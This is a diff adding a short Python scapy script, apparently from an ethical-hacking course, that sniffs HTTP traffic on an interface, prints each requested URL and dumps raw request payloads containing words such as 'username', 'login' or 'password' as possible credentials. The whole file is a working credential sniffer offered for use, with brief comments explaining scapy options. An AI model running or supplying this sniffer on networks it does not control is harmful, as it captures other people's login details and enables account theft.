@@ -1,0 +1,30 @@
+import scapy.all as scapy
+from scapy.layers import http
+
+
+#iface is the interface you want to sniff
+#store=false says not to store packets in memorry
+#prn specifies a call back function (every packet captured executes another function)
+#biot.com/capstats/bpf.html for other packet fitering options
+#haslayer is a method provided by scapy to see if the packet has data over the specified layer
+#raw layer contains passwords and username posts
+#load is the field with passwords and usernames
+
+
+def sniff(interface):
+    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
+
+def process_sniffed_packet(packet):
+    if packet.haslayer(http.HTTPRequest):
+        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+        print("[+] HTTP Request >> " + url)
+        if packet.haslayer(scapy.Raw):
+            load = str(packet[scapy.Raw].load)
+            keywords = ['username', 'login', 'email', 'user', 'password', 'pass']
+            for i in keywords:
+                if i in load:
+                    print("\n\n [+] Possible username/password > " + load + "\n\n")
+                    break
+
+
+sniff("eth0")
